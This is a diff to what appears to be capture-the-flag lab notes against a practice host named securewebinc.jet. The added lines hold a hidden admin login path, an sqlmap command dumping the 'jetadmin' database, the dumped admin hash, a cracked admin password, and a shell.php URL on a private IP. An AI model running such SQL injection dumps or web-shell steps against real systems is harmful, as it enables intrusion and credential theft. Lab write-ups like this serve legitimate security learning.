@@ -43,3 +43,32 @@ http://www.securewebinc.jet/js/secure.js
 }
 getStats();
 setInterval(function(){ getStats(); }, 10000);"
+
+```
+http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
+```
+
+
+## Bypassing Authentication
+
+```
+ sqlmap -r `pwd`/r.txt --database jetadmin -dbs --dump
+ ```
+
+
+```
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
++----+------------------------------------------------------------------+----------+
+```
+
+```
+admin:Hackthesystem200
+```
+
+## Command
+
+
+http://10.13.14.7:8000/shell.php
